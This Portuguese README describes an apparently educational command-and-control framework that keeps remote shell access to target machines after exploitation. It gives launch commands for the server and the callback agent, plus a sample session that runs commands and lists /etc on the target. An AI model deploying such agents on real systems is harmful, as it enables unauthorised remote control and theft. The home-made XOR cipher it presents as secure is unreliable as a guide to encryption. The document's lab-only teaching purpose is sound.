# Mini C2 Framework 🎛️

> Framework de Command & Control educacional com canal de comunicação criptografado, múltiplos agentes simultâneos e shell interativo.

Desenvolvido como parte de um portfólio de cibersegurança — red team / pós-exploração.
**Execute apenas em ambientes de laboratório que você possui ou tem autorização explícita.**

---

## ⚠️ Aviso Legal

Este projeto é estritamente **educacional**. Seu objetivo é demonstrar como frameworks C2 funcionam internamente para fins de estudo de cibersegurança defensiva e ofensiva. **Usar esta ferramenta em sistemas sem autorização explícita é ilegal.** O autor não se responsabiliza por qualquer uso indevido.

---

## Como Funciona

```
  ┌─────────────────────────────────────────────────────┐
  │                  LABORATÓRIO ISOLADO                │
  │                                                     │
  │   ┌──────────────┐    TCP cifrado    ┌───────────┐  │
  │   │   SERVIDOR   │ ◄──────────────►  │  AGENTE   │  │
  │   │  (atacante)  │   AES+HMAC-SHA256 │  (alvo)   │  │
  │   │  server.py   │                   │  agent.py │  │
  │   └──────────────┘                   └───────────┘  │
  │         │                                           │
  │   Shell interativo                                  │
  │   Múltiplos agentes                                 │
  └─────────────────────────────────────────────────────┘
```

**Fluxo de comunicação:**
1. Agente inicia conexão TCP com o servidor (beacon)
2. Servidor autentica o agente e registra a sessão
3. Operador seleciona um agente e envia comandos
4. Agente executa e retorna o resultado cifrado
5. Todo tráfego é cifrado e autenticado via HMAC

---

## Funcionalidades

- **Multi-agente** — gerencia múltiplas sessões simultâneas
- **Canal cifrado** — toda comunicação é cifrada + autenticada (HMAC-SHA256)
- **Derivação de chaves** — PBKDF2 com 100.000 iterações a partir de senha compartilhada
- **Beacon de identificação** — agente envia OS, usuário, hostname e PID ao conectar
- **Shell interativo** — comandos arbitrários executados no agente
- **Reconexão automática** — agente tenta reconectar se perder a conexão
- **Sem dependências externas** — apenas biblioteca padrão do Python 3

---

## Estrutura do Projeto

```
mini-c2/
├── server/
│   └── server.py       # Servidor C2 — painel do operador
├── agent/
│   └── agent.py        # Agente — executa na máquina alvo
├── shared/
│   └── crypto.py       # Módulo de criptografia compartilhado
└── README.md
```

---

## Uso

### 1. Iniciar o servidor

```bash
# Padrão (0.0.0.0:4444)
python3 server/server.py

# Customizado
python3 server/server.py --host 192.168.1.10 --port 5555 --password minha_senha
```

### 2. Conectar um agente (outra máquina ou terminal)

```bash
# Apontando para o servidor
python3 agent/agent.py --server 192.168.1.10 --port 4444 --password minha_senha
```

### 3. Interagir no servidor

```
c2> list

  ID    IP               OS           Usuário          Conectado em
  ----- ---------------- ------------ ---------------- --------------------
  1     192.168.1.50     Linux        usuario          2024-11-01 14:30:00

c2> interact 1

  agente-1> whoami
  usuario

  agente-1> sysinfo
  os          : Linux
  hostname    : maquina-alvo
  user        : usuario
  pid         : 1234
  cwd         : /home/usuario

  agente-1> ls /etc
  passwd shadow hosts ...

  agente-1> background

c2> kill 1
c2> exit
```

### Comandos do servidor

| Comando | Descrição |
|---------|-----------|
| `list` | Lista agentes conectados |
| `interact <id>` | Abre shell com agente |
| `kill <id>` | Desconecta agente |
| `help` | Menu de ajuda |
| `exit` | Encerra o servidor |

### Comandos especiais do agente

| Comando | Descrição |
|---------|-----------|
| `sysinfo` | Informações completas do sistema |
| `ps` | Processos em execução |
| `ifconfig` | Interfaces de rede (compatível com Windows/Linux) |
| `background` | Volta ao menu do servidor |
| `<qualquer cmd>` | Executado diretamente no shell |

---

## Configuração de Laboratório Recomendada

```
Host (servidor C2)
├── VirtualBox / VMware
│   ├── VM 1 — Kali Linux (servidor)  → python3 server/server.py
│   └── VM 2 — Ubuntu/Windows (alvo) → python3 agent/agent.py
└── Rede: Host-Only ou Internal Network (isolada)
```

> **Importante:** Nunca use em redes públicas ou sem autorização. Use sempre rede isolada (Host-Only).

---

## Detalhes Técnicos

| Aspecto | Implementação |
|---------|--------------|
| Transporte | TCP (socket raw) |
| Cifração | Stream cipher (PBKDF2 + XOR) |
| Autenticação | HMAC-SHA256 (Encrypt-then-MAC) |
| Derivação de chave | PBKDF2-HMAC-SHA256, 100.000 iterações |
| Framing | Length-prefix de 4 bytes (big-endian) |
| Concorrência | `threading.Thread` por agente |
| Reconexão | Loop com backoff configurável |

---

## Conceitos Demonstrados

- Arquitetura cliente/servidor assimétrica (C2)
- Cifração simétrica e derivação de chaves (PBKDF2)
- Autenticação de mensagens com HMAC (Encrypt-then-MAC)
- Framing de pacotes em protocolo binário
- Gerenciamento de múltiplas sessões com threads
- Execução remota de comandos (RCE controlada)
- Padrão de reconexão automática (resiliência)

---

## Relação com o Fluxo de Pentest

```
[Recon Toolkit] → [Port Scanner] → [Mini C2 Framework]
  Reconhecimento    Descoberta       Pós-exploração
                                     (acesso mantido)
```

Este projeto simula a fase de **pós-exploração** do framework MITRE ATT&CK, especificamente as táticas de **Command and Control (TA0011)** e **Execution (TA0002)**.

---

## Autor

**André Santana**
Pós-graduando em Ethical Hacking e Cibersegurança
[LinkedIn](https://www.linkedin.com/in/andrevsantana/) · [GitHub](https://github.com/vSantanaa)
